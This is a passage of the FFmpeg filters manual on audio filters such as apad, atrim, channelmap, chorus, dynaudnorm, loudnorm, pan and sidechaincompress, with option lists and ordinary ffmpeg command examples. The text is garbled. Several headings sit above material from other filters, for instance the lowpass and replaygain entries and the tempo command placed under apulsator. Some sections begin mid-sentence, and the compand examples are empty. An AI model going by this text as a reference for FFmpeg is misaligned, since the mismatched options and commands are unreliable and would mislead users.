[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax. Used only if set to non-negative value.

`whole_dur`

Specify the minimum total duration in the output audio stream. See
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax. Used only if set to non-negative value. If the value is longer than
the input audio length, silence is added to the end, until the value is reached.
This option is mutually exclusive with `pad_dur`

If neither the `pad_len` nor the `whole_len` nor `pad_dur`
nor `whole_dur` option is set, the filter will add silence to the end of
the input stream indefinitely.

Note that for ffmpeg 4.4 and earlier a zero `pad_dur` or
`whole_dur` also caused the filter to add silence indefinitely.

#### [8.41.1 Examples](#toc-Examples-15)

* Add 1024 samples of silence to the end of the input:
  ```
  apad=pad_len=1024

  ```
* Make sure the audio output will contain at least 10000 samples, pad
  the input with silence if required:
  ```
  apad=whole_len=10000

  ```
* Use `ffmpeg` to pad the audio input with silence, so that the
  video stream will always result the shortest and will be converted
  until the end in the output file when using the `shortest`
  option:
  ```
  ffmpeg -i VIDEO -i AUDIO -filter_complex "[1:0]apad" -shortest OUTPUT

  ```

### [8.46 apulsator](#toc-apulsator)

Audio pulsator is something between an autopanner and a tremolo.
But it can produce funny stereo effects as well. Pulsator changes the volume
of the left and right channel based on a LFO (low frequency oscillator) with
different waveforms and shifted phases.
This filter have the ability to define an offset between left and right
channel. An offset of 0 means that both LFO shapes match each other.
The left and right channel are altered equally - a conventional tremolo.
An offset of 50% means that the shape of the right channel is exactly shifted
in phase (or moved backwards about half of the frequency) - pulsator acts as
an autopanner. At 1 both curves match again. Every setting in between moves the
phase shift gapless between all stages and produces some "bypassing" sounds with
sine and triangle waveforms. The more you set the offset near 1 (starting from
the 0.5) the faster the signal passes from the left to the right speaker.

#### [8.65.2 Commands](#toc-Commands-27)

This filter supports the following commands:

`tempo`

Change filter tempo scale factor.
Syntax for the command is : "tempo"

### [8.66 atilt](#toc-atilt)

Apply spectral tilt filter to audio stream.

This filter apply any spectral roll-off slope over any specified frequency band.

The filter accepts the following options:

`freq`

Set central frequency of tilt in Hz. Default is 10000 Hz.

`slope`

Set slope direction of tilt. Default is 0. Allowed range is from -1 to 1.

`width`

Set width of tilt. Default is 1000. Allowed range is from 100 to 10000.

`order`

Set order of tilt filter.

`level`

Set input volume level. Allowed range is from 0 to 4.
Default is 1.

#### [8.66.1 Commands](#toc-Commands-28)

This filter supports the all above options as [commands](#commands).

### [8.67 atrim](#toc-atrim)

Trim the input so that the output contains one continuous subpart of the input.

It accepts the following parameters:

`start`

Timestamp (in seconds) of the start of the section to keep. I.e. the audio
sample with the timestamp start will be the first sample in the output.

`end`

Specify time of the first audio sample that will be dropped, i.e. the
audio sample immediately preceding the one with the timestamp end will be
the last sample in the output.

`start_pts`

Same as start, except this option sets the start timestamp in samples
instead of seconds.

`end_pts`

Same as end, except this option sets the end timestamp in samples instead
of seconds.

`duration`

The maximum duration of the output in seconds.

`start_sample`

The number of the first sample that should be output.

`end_sample`

The number of the first sample that should be dropped.

`start`, `end`, and `duration` are expressed as time
duration specifications; see
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax).

Note that the first two sets of the start/end options and the `duration`
option look at the frame timestamp, while the \_sample options simply count the
samples that pass through the filter. So start/end\_pts and start/end\_sample will
give different results when the timestamps are wrong, inexact or do not start at
zero. Also note that this filter does not modify the timestamps. If you wish
to have the output timestamps start at zero, insert the asetpts filter after the
atrim filter.

If multiple start or end options are set, this filter tries to be greedy and
keep all samples that match at least one of the specified constraints. To keep
only the part that matches all the constraints at once, chain multiple atrim
filters.

The defaults are such that all the input is kept. So it is possible to set e.g.
just the end values to keep everything before the specified time.

Examples:

* Drop everything except the second minute of input:
  ```
  ffmpeg -i INPUT -af atrim=60:120

  ```
* Keep only the first 1000 samples:
  ```
  ffmpeg -i INPUT -af atrim=end_sample=1000

  ```

### [8.68 axcorrelate](#toc-axcorrelate)

Calculate normalized windowed cross-correlation between two input audio streams.

Resulted samples are always between -1 and 1 inclusive.
If result is 1 it means two input samples are highly correlated in that selected segment.
Result 0 means they are not correlated at all.
If result is -1 it means two input samples are out of phase, which means they cancel each
other.

The filter accepts the following options:

`size`

Set size of segment over which cross-correlation is calculated.
Default is 256. Allowed range is from 2 to 131072.

`algo`

Set algorithm for cross-correlation. Can be `slow` or `fast` or `best`.
Default is `best`. Fast algorithm assumes mean values over any given segment
are always zero and thus need much less calculations to make.
This is generally not true, but is valid for typical audio streams.

#### [8.68.1 Examples](#toc-Examples-19)

* Calculate correlation between channels in stereo audio stream:
  ```
  ffmpeg -i stereo.wav -af channelsplit,axcorrelate=size=1024:algo=fast correlation.wav

### [8.73 bs2b](#toc-bs2b)

Bauer stereo to binaural transformation, which improves headphone listening of
stereo audio records.

To enable compilation of this filter you need to configure FFmpeg with

It accepts the following parameters:

`profile`

Pre-defined crossfeed level.

`default`

Default level (fcut=700, feed=50).

`cmoy`

Chu Moy circuit (fcut=700, feed=60).

`fcut`

Cut frequency (in Hz).

`feed`

Feed level (in Hz).

### [8.74 channelmap](#toc-channelmap)

Remap input channels to new locations.

It accepts the following parameters:

`map`

Map channels from input to output. The argument is a ’|’-separated list of
mappings, each in the `in_channel-out_channel` or
`in_channel` form. in\_channel can be either the name of the
input channel (e.g. FL for front left) or its index in the input channel
layout. out\_channel is the name of the output channel or its index in the
output channel layout. If out\_channel is not given then it is implicitly
an index, starting with zero and increasing by one for each mapping. Mixing
different types of mappings is not allowed and will result in a parse error.

`channel_layout`

The channel layout of the output stream. If not specified, then filter will
guess it based on the out\_channel names or the number of mappings.
Guessed layouts will not necessarily contain channels in the order of the
mappings.

If no mapping is present, the filter will implicitly map input channels to
output channels, preserving indices.

#### [8.74.1 Examples](#toc-Examples-20)

* For example, assuming a 5.1+downmix input MOV file,
  ```
  ffmpeg -i in.mov -filter 'channelmap=map=DL-FL|DR-FR' out.wav

  ```

  will create an output WAV file tagged as stereo from the downmix channels of
  the input.
* To fix a 5.1 WAV improperly encoded in AAC’s native channel order
  ```
  ffmpeg -i in.wav -filter 'channelmap=1|2|0|5|3|4:5.1' out.wav

  ```

### [8.75 channelsplit](#toc-channelsplit)

Split each channel from an input audio stream into a separate output stream.

It accepts the following parameters:

`channel_layout`

The channel layout of the input stream. The default is "stereo".

`channels`

A channel layout describing the channels to be extracted as separate output streams
or "all" to extract each input channel as a separate stream. The default is "all".

Choosing channels not present in channel layout in the input will result in an error.

#### [8.75.1 Examples](#toc-Examples-21)

* For example, assuming a stereo input MP3 file,
  ```
  ffmpeg -i in.mp3 -filter_complex channelsplit out.mkv

  ```

  will create an output Matroska file with two audio streams, one containing only
  the left channel and the other the right channel.
* Split a 5.1 WAV file into per-channel files:
  ```
  ffmpeg -i in.wav -filter_complex
  'channelsplit=channel_layout=5.1[FL][FR][FC][LFE][SL][SR]'
  -map '[FL]' front_left.wav -map '[FR]' front_right.wav -map '[FC]'
  front_center.wav -map '[LFE]' lfe.wav -map '[SL]' side_left.wav -map '[SR]'
  side_right.wav

  ```
* Extract only LFE from a 5.1 WAV file:
  ```
  ffmpeg -i in.wav -filter_complex 'channelsplit=channel_layout=5.1:channels=LFE[LFE]'
  -map '[LFE]' lfe.wav

  ```

### [8.76 chorus](#toc-chorus)

Add a chorus effect to the audio.

Can make a single vocal sound like a chorus, but can also be applied to instrumentation.

Chorus resembles an echo effect with a short delay, but whereas with echo the delay is
constant, with chorus, it is varied using using sinusoidal or triangular modulation.
The modulation depth defines the range the modulated delay is played before or after
the delay. Hence the delayed sound will sound slower or faster, that is the delayed
sound tuned around the original one, like in a chorus where some vocals are slightly
off key.

It accepts the following parameters:

`in_gain`

Set input gain. Default is 0.4.

`out_gain`

Set output gain. Default is 0.4.

`delays`

Set delays. A typical delay is around 40ms to 60ms.

`decays`

Set decays.

`speeds`

Set speeds.

`depths`

Set depths.

#### [8.76.1 Examples](#toc-Examples-22)

* A single delay:
  ```
  chorus=0.7:0.9:55:0.4:0.25:2

  ```
* Two delays:
  ```
  chorus=0.6:0.9:50|60:0.4|0.32:0.25|0.4:2|1.3

  ```
* Fuller sounding chorus with three delays:
  ```
  chorus=0.5:0.9:50|60|40:0.4|0.32|0.3:0.25|0.4|0.3:2|2.3|1.3

  ```

### [8.77 compand](#toc-compand)

Compress or expand the audio’s dynamic range.

It accepts the following parameters:

`attacks`
`decays`

A list of times in seconds for each channel over which the instantaneous level
of the input signal is averaged to determine its volume. attacks refers to
increase of volume and decays refers to decrease of volume. For most
situations, the attack time (response to the audio getting louder) should be
shorter than the decay time, because the human ear is more sensitive to sudden
loud audio than sudden soft audio. A typical value for attack is 0.3 seconds and
a typical value for decay is 0.8 seconds.
If specified number of attacks & decays is lower than number of channels, the last
set attack/decay will be used for all remaining channels.

`points`

A list of points for the transfer function, specified in dB relative to the
maximum possible signal amplitude. Each key points list must be defined using
the following syntax: `x0/y0|x1/y1|x2/y2|....` or
`x0/y0 x1/y1 x2/y2 ....`

The input values must be in strictly increasing order but the transfer function
does not have to be monotonically rising. The point `0/0` is assumed but
may be overridden (by `0/out-dBn`). Typical values for the transfer
function are `-70/-70|-60/-20|1/0`.

`soft-knee`

Set the curve radius in dB for all joints. It defaults to 0.01.

`gain`

Set the additional gain in dB to be applied at all points on the transfer
function. This allows for easy adjustment of the overall gain.
It defaults to 0.

`volume`

Set an initial volume, in dB, to be assumed for each channel when filtering
starts. This permits the user to supply a nominal level initially, so that, for
example, a very large gain is not applied to initial signal levels before the
companding has begun to operate. A typical value for audio which is initially
quiet is -90 dB. It defaults to 0.

`delay`

Set a delay, in seconds. The input audio is analyzed immediately, but audio is
delayed before being fed to the volume adjuster. Specifying a delay
approximately equal to the attack/decay times allows the filter to effectively
operate in predictive rather than reactive mode. It defaults to 0.

#### [8.77.1 Examples](#toc-Examples-23)

* Make music with both quiet and loud passages suitable for listening to in a
  noisy environment:
  ```

  ```
* Here is another noise gate, this time for when the noise is at a higher level
  than the signal (making it, in some ways, similar to squelch):

  ```

### [8.78 compensationdelay](#toc-compensationdelay)

Compensation Delay Line is a metric based delay to compensate differing
positions of microphones or speakers.

For example, you have recorded guitar with two microphones placed in
different locations. Because the front of sound wave has fixed speed in
normal conditions, the phasing of microphones can vary and depends on
their location and interposition. The best sound mix can be achieved when
these microphones are in phase (synchronized). Note that a distance of
~30 cm between microphones makes one microphone capture the signal in
antiphase to the other microphone. That makes the final mix sound moody.
This filter helps to solve phasing problems by adding different delays
to each microphone track and make them synchronized.

The best result can be reached when you take one track as base and
synchronize other tracks one by one with it.
Remember that synchronization/delay tolerance depends on sample rate, too.
Higher sample rates will give more tolerance.

The filter accepts the following parameters:

`mm`

Set millimeters distance. This is compensation distance for fine tuning.
Default is 0.

`cm`

Set cm distance. This is compensation distance for tightening distance setup.
Default is 0.

`m`

Set meters distance. This is compensation distance for hard distance setup.
Default is 0.

`dry`

Set dry amount. Amount of unprocessed (dry) signal.
Default is 0.

`wet`

Set wet amount. Amount of processed (wet) signal.
Default is 1.

`temp`

Set temperature in degrees Celsius. This is the temperature of the environment.
Default is 20.

#### [8.78.1 Commands](#toc-Commands-33)

This filter supports the all above options as [commands](#commands).

### [8.79 crossfeed](#toc-crossfeed)

Apply headphone crossfeed filter.

Crossfeed is the process of blending the left and right channels of stereo
audio recording.

The intent is to produce more speaker like sound to the listener.

The filter accepts the following options:

`strength`

Set strength of crossfeed. Default is 0.2. Allowed range is from 0 to 1.
This sets gain of low shelf filter for side part of stereo image.
Default is -6dB. Max allowed is -30db when strength is set to 1.

`range`

Set soundstage wideness. Default is 0.5. Allowed range is from 0 to 1.
This sets cut off frequency of low shelf filter. Default is cut off near
1550 Hz. With range set to 1 cut off frequency is set to 2100 Hz.

`slope`

Set curve slope of low shelf filter. Default is 0.5.
Allowed range is from 0.01 to 1.

`level_in`

Set input gain. Default is 0.9.

`level_out`

Set output gain. Default is 1.

`block_size`

Set block size used for reverse IIR processing. If this value is set to high enough
value (higher than impulse response length truncated when reaches near zero values) filtering
will become linear phase otherwise if not big enough it will just produce nasty artifacts.

#### [8.80.1 Commands](#toc-Commands-35)

This filter supports the all above options as [commands](#commands).

### [8.81 dcshift](#toc-dcshift)

headroom and hence volume. The [astats](#astats) filter can be used to determine if
a signal has a DC offset.

`shift`

Set the DC shift, allowed range is [-1, 1]. It indicates the amount to shift
the audio.

`limitergain`

Optional. It should have a value much less than 1 (e.g. 0.05 or 0.02) and is
used to prevent clipping.

`length`

Default is 3 seconds.

### [8.85 dynaudnorm](#toc-dynaudnorm)

Dynamic Audio Normalizer.

This filter applies a certain amount of gain to the input audio in order
to bring its peak magnitude to a target level (e.g. 0 dBFS). However, in
contrast to more "simple" normalization algorithms, the Dynamic Audio
Normalizer \*dynamically\* re-adjusts the gain factor to the input audio.
This allows for applying extra gain to the "quiet" sections of the audio
while avoiding distortions or clipping the "loud" sections. In other words:
The Dynamic Audio Normalizer will "even out" the volume of quiet and loud
sections, in the sense that the volume of each section is brought to the
same target level. Note, however, that the Dynamic Audio Normalizer achieves
this goal \*without\* applying "dynamic range compressing". It will retain 100%
of the dynamic range \*within\* each section of the audio file.

`framelen, f`

Set the frame length in milliseconds. In range from 10 to 8000 milliseconds.
Default is 500 milliseconds.
The Dynamic Audio Normalizer processes the input audio in small chunks,
referred to as frames. This is required, because a peak magnitude has no
meaning for just a single sample value. Instead, we need to determine the
peak magnitude for a contiguous sequence of sample values. While a "standard"
normalizer would simply use the peak magnitude of the complete file, the
Dynamic Audio Normalizer determines the peak magnitude individually for each
frame. The length of a frame is specified in milliseconds. By default, the
Dynamic Audio Normalizer uses a frame length of 500 milliseconds, which has
been found to give good results with most files.
Note that the exact frame length, in number of samples, will be determined
automatically, based on the sampling rate of the individual input audio file.

`gausssize, g`

Set the Gaussian filter window size. In range from 3 to 301, must be odd
number. Default is 31.
Probably the most important parameter of the Dynamic Audio Normalizer is the
`window size` of the Gaussian smoothing filter. The filter’s window size
is specified in frames, centered around the current frame. For the sake of
simplicity, this must be an odd number. Consequently, the default value of 31
takes into account the current frame, as well as the 15 preceding frames and
the 15 subsequent frames. Using a larger window results in a stronger
smoothing effect and thus in less gain variation, i.e. slower gain
adaptation. Conversely, using a smaller window results in a weaker smoothing
effect and thus in more gain variation, i.e. faster gain adaptation.
In other words, the more you increase this value, the more the Dynamic Audio
Normalizer will behave like a "traditional" normalization filter. On the
contrary, the more you decrease this value, the more the Dynamic Audio
Normalizer will behave like a dynamic range compressor.

`peak, p`

Set the target peak value. This specifies the highest permissible magnitude
level for the normalized audio input. This filter will try to approach the
target peak magnitude as closely as possible, but at the same time it also
makes sure that the normalized signal will never exceed the peak magnitude.
A frame’s maximum local gain factor is imposed directly by the target peak
magnitude. The default value is 0.95 and thus leaves a headroom of 5%\*.
It is not recommended to go above this value.

`maxgain, m`

Set the maximum gain factor. In range from 1.0 to 100.0. Default is 10.0.
The Dynamic Audio Normalizer determines the maximum possible (local) gain
factor for each input frame, i.e. the maximum gain factor that does not
result in clipping or distortion. The maximum gain factor is determined by
the frame’s highest magnitude sample. However, the Dynamic Audio Normalizer
additionally bounds the frame’s maximum gain factor by a predetermined
(global) maximum gain factor. This is done in order to avoid excessive gain
factors in "silent" or almost silent frames. By default, the maximum gain
factor is 10.0, For most inputs the default value should be sufficient and
it usually is not recommended to increase this value. Though, for input
with an extremely low overall volume level, it may be necessary to allow even
higher gain factors. Note, however, that the Dynamic Audio Normalizer does
not simply apply a "hard" threshold (i.e. cut off values above the threshold).
Instead, a "sigmoid" threshold function will be applied. This way, the
gain factors will smoothly approach the threshold value, but never exceed that
value.

`targetrms, r`

Set the target RMS. In range from 0.0 to 1.0. Default is 0.0 - disabled.
By default, the Dynamic Audio Normalizer performs "peak" normalization.
This means that the maximum local gain factor for each frame is defined
(only) by the frame’s highest magnitude sample. This way, the samples can
be amplified as much as possible without exceeding the maximum signal
level, i.e. without clipping. Optionally, however, the Dynamic Audio
Normalizer can also take into account the frame’s root mean square,
abbreviated RMS. In electrical engineering, the RMS is commonly used to
determine the power of a time-varying signal. It is therefore considered
that the RMS is a better approximation of the "perceived loudness" than
just looking at the signal’s peak magnitude. Consequently, by adjusting all
frames to a constant RMS value, a uniform "perceived loudness" can be
established. If a target RMS value has been specified, a frame’s local gain
factor is defined as the factor that would result in exactly that RMS value.
Note, however, that the maximum local gain factor is still restricted by the
frame’s highest magnitude sample, in order to prevent clipping.

`coupling, n`

Enable channels coupling. By default is enabled.
By default, the Dynamic Audio Normalizer will amplify all channels by the same
amount. This means the same gain factor will be applied to all channels, i.e.
the maximum possible gain factor is determined by the "loudest" channel.
However, in some recordings, it may happen that the volume of the different
channels is uneven, e.g. one channel may be "quieter" than the other one(s).
In this case, this option can be used to disable the channel coupling. This way,
the gain factor will be determined independently for each channel, depending
only on the individual channel’s highest magnitude sample. This allows for
harmonizing the volume of the different channels.

`correctdc, c`

Enable DC bias correction. By default is disabled.
An audio signal (in the time domain) is a sequence of sample values.
In the Dynamic Audio Normalizer these sample values are represented in the
-1.0 to 1.0 range, regardless of the original input format. Normally, the
audio signal, or "waveform", should be centered around the zero point.
That means if we calculate the mean value of all samples in a file, or in a
single frame, then the result should be 0.0 or at least very close to that
value. If, however, there is a significant deviation of the mean value from
0.0, in either positive or negative direction, this is referred to as a
DC bias or DC offset. Since a DC bias is clearly undesirable, the Dynamic
Audio Normalizer provides optional DC bias correction.
With DC bias correction enabled, the Dynamic Audio Normalizer will determine
the mean value, or "DC correction" offset, of each input frame and subtract
that value from all of the frame’s sample values which ensures those samples
are centered around 0.0 again. Also, in order to avoid "gaps" at the frame
boundaries, the DC correction offset values will be interpolated smoothly
between neighbouring frames.

`altboundary, b`

Enable alternative boundary mode. By default is disabled.
The Dynamic Audio Normalizer takes into account a certain neighbourhood
around each frame. This includes the preceding frames as well as the
subsequent frames. However, for the "boundary" frames, located at the very
beginning and at the very end of the audio file, not all neighbouring
frames are available. In particular, for the first few frames in the audio
file, the preceding frames are not known. And, similarly, for the last few
frames in the audio file, the subsequent frames are not known. Thus, the
question arises which gain factors should be assumed for the missing frames
in the "boundary" region. The Dynamic Audio Normalizer implements two modes
to deal with this situation. The default boundary mode assumes a gain factor
of exactly 1.0 for the missing frames, resulting in a smooth "fade in" and
"fade out" at the beginning and at the end of the input, respectively.

`compress, s`

Set the compress factor. In range from 0.0 to 30.0. Default is 0.0.
By default, the Dynamic Audio Normalizer does not apply "traditional"
compression. This means that signal peaks will not be pruned and thus the
full dynamic range will be retained within each local neighbourhood. However,
in some cases it may be desirable to combine the Dynamic Audio Normalizer’s
normalization algorithm with a more "traditional" compression.
For this purpose, the Dynamic Audio Normalizer provides an optional compression
(thresholding) function. If (and only if) the compression feature is enabled,
all input frames will be processed by a soft knee thresholding function prior
to the actual normalization process. Put simply, the thresholding function is
going to prune all samples whose magnitude exceeds a certain threshold value.
However, the Dynamic Audio Normalizer does not simply apply a fixed threshold
value. Instead, the threshold value will be adjusted for each individual
frame.
In general, smaller parameters result in stronger compression, and vice versa.
Values below 3.0 are not recommended, because audible distortion may appear.

`threshold, t`

Set the target threshold value. This specifies the lowest permissible
magnitude level for the audio input which will be normalized.
If input frame volume is above this value frame will be normalized.
Otherwise frame may not be normalized at all. The default value is set
to 0, which means all input frames will be normalized.
This option is mostly useful if digital noise is not wanted to be amplified.

`channels, h`

Specify which channels to filter, by default all available channels are filtered.

`overlap, o`

Specify overlap for frames. If set to 0 (default) no frame overlapping is done.
Using >0 and <1 values will make less conservative gain adjustments, like
when framelen option is set to smaller value, if framelen option value is
compensated for non-zero overlap then gain adjustments will be smoother across time
compared to zero overlap case.

`curve, v`

Specify the peak mapping curve expression which is going to be used when calculating
gain applied to frames. The max output frame gain will still be limited by other
options mentioned previously for this filter.

The expression can contain the following constants:

`ch`

current channel number

`sn`

current sample number

`nb_channels`

number of channels

`t`

timestamp expressed in seconds

`sr`

sample rate

`p`

current frame peak value

### [8.95 join](#toc-join)

Join multiple input streams into one multi-channel stream.

It accepts the following parameters:

`inputs`

The number of input streams. It defaults to 2.

`channel_layout`

The desired output channel layout. It defaults to stereo.

`map`

Map channels from inputs to output. The argument is a ’|’-separated list of
mappings, each in the `input_idx.in_channel-out_channel`
form. input\_idx is the 0-based index of the input stream. in\_channel
can be either the name of the input channel (e.g. FL for front left) or its
index in the specified input stream. out\_channel is the name of the output
channel.

The filter will attempt to guess the mappings when they are not specified
explicitly. It does so by first trying to find an unused matching input channel
and if that fails it picks the first unused input channel.

Join 3 inputs (with properly set channel layouts):

```
ffmpeg -i INPUT1 -i INPUT2 -i INPUT3 -filter_complex join=inputs=3 OUTPUT

```

Build a 5.1 output from 6 single-channel streams:

```
ffmpeg -i fl -i fr -i fc -i sl -i sr -i lfe -filter_complex
'join=inputs=6:channel_layout=5.1:map=0.0-FL|1.0-FR|2.0-FC|3.0-SL|4.0-SR|5.0-LFE'
out

```

### [8.96 ladspa](#toc-ladspa)

Load a LADSPA (Linux Audio Developer’s Simple Plugin API) plugin.

To enable compilation of this filter you need to configure FFmpeg with
`--enable-ladspa`.

`file, f`

Specifies the name of LADSPA plugin library to load. If the environment
variable `LADSPA_PATH` is defined, the LADSPA plugin is searched in
each one of the directories specified by the colon separated list in
`LADSPA_PATH`, otherwise in the standard LADSPA paths, which are in
this order: `HOME/.ladspa/lib/`, `/usr/local/lib/ladspa/`,
`/usr/lib/ladspa/`.

`plugin, p`

Specifies the plugin within the library. Some libraries contain only
one plugin, but others contain many of them. If this is not set filter
will list all available plugins within the specified library.

`controls, c`

Set the ’|’ separated list of controls which are zero or more floating point
values that determine the behavior of the loaded plugin (for example delay,
threshold or gain).
Controls need to be defined using the following syntax:
c0=value0|c1=value1|c2=value2|..., where
valuei is the value set on the i-th control.
Alternatively they can be also defined using the following syntax:
value0|value1|value2|..., where
valuei is the value set on the i-th control.
If `controls` is set to `help`, all available controls and
their valid ranges are printed.

`sample_rate, s`

Specify the sample rate, default to 44100. Only used if plugin have
zero inputs.

`nb_samples, n`

Set the number of samples per channel per each output frame, default
is 1024. Only used if plugin have zero inputs.

`duration, d`

Set the minimum duration of the sourced audio. See
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax.
Note that the resulting duration may be greater than the specified duration,
as the generated audio is always cut at the end of a complete frame.
If not specified, or the expressed duration is negative, the audio is
supposed to be generated forever.
Only used if plugin have zero inputs.

`latency, l`

Enable latency compensation, by default is disabled.
Only used if plugin have inputs.

### [8.97 loudnorm](#toc-loudnorm)

EBU R128 loudness normalization. Includes both dynamic and linear normalization modes.
Support for both single pass (livestreams, files) and double pass (files) modes.
This algorithm can target IL, LRA, and maximum true peak. In dynamic mode, to accurately
detect true peaks, the audio stream will be upsampled to 192 kHz.
Use the `-ar` option or `aresample` filter to explicitly set an output sample rate.

The filter accepts the following options:

`I, i`

Set integrated loudness target.
Range is -70.0 - -5.0. Default value is -24.0.

`LRA, lra`

Set loudness range target.
Range is 1.0 - 50.0. Default value is 7.0.

`TP, tp`

Set maximum true peak.
Range is -9.0 - +0.0. Default value is -2.0.

`measured_I, measured_i`

Measured IL of input file.
Range is -99.0 - +0.0.

`measured_LRA, measured_lra`

Measured LRA of input file.
Range is 0.0 - 99.0.

`measured_TP, measured_tp`

Measured true peak of input file.
Range is -99.0 - +99.0.

`measured_thresh`

Measured threshold of input file.
Range is -99.0 - +0.0.

`offset`

Set offset gain. Gain is applied before the true-peak limiter.
Range is -99.0 - +99.0. Default is +0.0.

`linear`

Normalize by linearly scaling the source audio.
`measured_I`, `measured_LRA`, `measured_TP`,
and `measured_thresh` must all be specified. Target LRA shouldn’t
be lower than source LRA and the change in integrated loudness shouldn’t
result in a true peak which exceeds the target TP. If any of these
conditions aren’t met, normalization mode will revert to dynamic.
Options are `true` or `false`. Default is `true`.

`dual_mono`

Treat mono input files as "dual-mono". If a mono file is intended for playback
on a stereo system, its EBU R128 measurement will be perceptually incorrect.
If set to `true`, this option will compensate for this effect.
Multi-channel input files are not affected by this option.
Options are true or false. Default is false.

`print_format`

Set print format for stats. Options are summary, json, or none.
Default value is none.

### [8.98 lowpass](#toc-lowpass)

value (higher than impulse response length truncated when reaches near zero values) filtering
will become linear phase otherwise if not big enough it will just produce nasty artifacts.

Note that filter delay will be exactly this many samples when set to non-zero value.

#### [8.98.1 Examples](#toc-Examples-28)

`--enable-lv2`.

`plugin, p`

Specifies the plugin URI. You may need to escape ’:’.

`controls, c`

#### [8.99.2 Commands](#toc-Commands-43)

This filter supports all options that are exported by plugin as commands.

### [8.100 mcompand](#toc-mcompand)

Multiband Compress or expand the audio’s dynamic range.

The input audio is divided into bands using 4th order Linkwitz-Riley IIRs.
This is akin to the crossover of a loudspeaker, and results in flat frequency
response when absent compander action.

It accepts the following parameters:

`args`

This option syntax is:
attack,decay,[attack,decay..] soft-knee points crossover\_frequency [delay [initial\_volume [gain]]] | attack,decay ...
For explanation of each item refer to compand filter documentation.

### [8.101 pan](#toc-pan-1)

Mix channels with specific gain levels. The filter accepts the output
channel layout followed by a set of channels definitions.

This filter is also designed to efficiently remap the channels of an audio
stream.

The filter accepts parameters of the form:
"l|outdef|outdef|..."

`l`

output channel layout or number of channels

`outdef`

output channel specification, of the form:
"out\_name=[gain\*]in\_name[(+-)[gain\*]in\_name...]"

`out_name`

output channel to define, either a channel name (FL, FR, etc.) or a channel
number (c0, c1, etc.)

`gain`

multiplicative coefficient for the channel, 1 leaving the volume unchanged

`in_name`

input channel to use, see out\_name for details; it is not possible to mix
named and numbered input channels

If the ‘=’ in a channel specification is replaced by ‘<’, then the gains for
that specification will be renormalized so that the total is 1, thus
avoiding clipping noise.

#### [8.101.1 Mixing examples](#toc-Mixing-examples)

For example, if you want to down-mix from stereo to mono, but with a bigger
factor for the left channel:

```
pan=1c|c0=0.9*c0+0.1*c1

```

A customized down-mix to stereo that works automatically for 3-, 4-, 5- and
7-channels surround:

```
pan=stereo| FL < FL + 0.5*FC + 0.6*BL + 0.6*SL | FR < FR + 0.5*FC + 0.6*BR + 0.6*SR

```

Note that `ffmpeg` integrates a default down-mix (and up-mix) system
that should be preferred (see "-ac" option) unless you have very specific
needs.

#### [8.101.2 Remapping examples](#toc-Remapping-examples)

The channel remapping will be effective if, and only if:

* gain coefficients are zeroes or ones,
* only one input per channel output,

If all these conditions are satisfied, the filter will notify the user ("Pure
channel mapping detected"), and use an optimized and lossless method to do the
remapping.

For example, if you have a 5.1 source and want a stereo audio stream by
dropping the extra channels:

```
pan="stereo| c0=FL | c1=FR"

```

Given the same source, you can also switch front left and front right channels
and keep the input channel layout:

```
pan="5.1| c0=c1 | c1=c0 | c2=c2 | c3=c3 | c4=c4 | c5=c5"

```

If the input is a stereo audio stream, you can mute the front left channel (and
still keep the stereo channel layout) with:

```
pan="stereo|c1=c1"

```

Still with a stereo audio stream input, you can copy the right channel in both
front left and right:

```
pan="stereo| c0=FR | c1=FR"

```

### [8.102 replaygain](#toc-replaygain)

Syntax for the command is : "pitch"

### [8.105 sidechaincompress](#toc-sidechaincompress)

This filter acts like normal compressor but has the ability to compress
detected signal using second input signal.
It needs two input streams and returns one output stream.
First input stream will be processed depending on second stream signal.
The filtered signal then can be filtered with other filters in later stages of
processing. See [pan](#pan) and [amerge](#amerge) filter.

The filter accepts the following options:

`level_in`

Set input gain. Default is 1. Range is between 0.015625 and 64.

`mode`

Set mode of compressor operation. Can be `upward` or `downward`.
Default is `downward`.

`threshold`

If a signal of second stream raises above this level it will affect the gain
reduction of first stream.
By default is 0.125. Range is between 0.00097563 and 1.

`ratio`

Set a ratio about which the signal is reduced. 1:2 means that if the level
raised 4dB above the threshold, it will be only 2dB above after the reduction.
Default is 2. Range is between 1 and 20.

`attack`

Amount of milliseconds the signal has to rise above the threshold before gain
reduction starts. Default is 20. Range is between 0.01 and 2000.

`release`

Amount of milliseconds the signal has to fall below the threshold before
reduction is decreased again. Default is 250. Range is between 0.01 and 9000.

`makeup`

Set the amount by how much signal will be amplified after processing.
Default is 1. Range is from 1 to 64.

`knee`

Curve the sharp knee around the threshold to enter gain reduction more softly.
Default is 2.82843. Range is between 1 and 8.

`link`

Choose if the `average` level between all channels of side-chain stream
or the louder(`maximum`) channel of side-chain stream affects the
reduction. Default is `average`.

`detection`

Should the exact signal be taken in case of `peak` or an RMS one in case
of `rms`. Default is `rms` which is mainly smoother.

`level_sc`

Set sidechain gain. Default is 1. Range is between 0.015625 and 64.

`mix`

How much to use compressed signal in output. Default is 1.
Range is between 0 and 1.

#### [8.105.1 Commands](#toc-Commands-45)

This filter supports the all above options as [commands](#commands).

#### [8.105.2 Examples](#toc-Examples-30)

* Full ffmpeg example taking 2 audio inputs, 1st input to be compressed
  depending on the signal of 2nd input and later compressed signal to be
  merged with 2nd input:
  ```
  ffmpeg -i main.flac -i sidechain.flac -filter_complex "[1:a]asplit=2[sc][mix];[0:a][sc]sidechaincompress[compr];[compr][mix]amerge"

  ```

### [8.106 sidechaingate](#toc-sidechaingate)

A sidechain gate acts like a normal (wideband) gate but has the ability to
filter the detected signal before sending it to the gain reduction stage.
Normally a gate uses the full range signal to detect a level above the
threshold.
For example: If you cut all lower frequencies from your sidechain signal
the gate will decrease the volume of your track only if not enough highs
appear. With this technique you are able to reduce the resonation of a
natural drum or remove "rumbling" of muted strokes from a heavily distorted
guitar.
It needs two input streams and returns one output stream.
First input stream will be processed depending on second stream signal.

The filter accepts the following options:

`level_in`

Set input level before filtering.
Default is 1. Allowed range is from 0.015625 to 64.

`mode`

Set the mode of operation. Can be `upward` or `downward`.
Default is `downward`. If set to `upward` mode, higher parts of signal
